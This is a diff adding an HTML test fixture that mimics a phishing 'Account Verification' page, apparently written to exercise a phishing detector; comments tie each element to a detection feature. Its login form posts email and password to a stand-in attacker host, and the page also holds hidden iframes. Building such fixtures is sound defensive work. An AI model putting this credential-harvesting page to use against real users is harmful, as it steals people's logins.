@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Account Verification</title>
+  <!-- External favicon triggers favicon_is_external -->
+  <link rel="icon" href="https://cdn.example.com/favicon.ico">
+</head>
+<body>
+  <!-- Minimal content (< 500 chars body text) triggers thin_page_with_login -->
+  <h1>Verify Your Account</h1>
+  <p>Please enter your credentials to continue.</p>
+
+  <!-- Form submitting to external domain triggers password_form_submits_external + has_password_field -->
+  <form action="https://evil-collector.example.com/steal" method="POST">
+    <input type="email" name="email" placeholder="Email">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Log In</button>
+  </form>
+
+  <!-- Hidden iframe triggers hidden_iframes -->
+  <iframe src="about:blank" style="display:none"></iframe>
+  <iframe src="about:blank" style="visibility:hidden;width:0;height:0"></iframe>
+</body>
+</html>
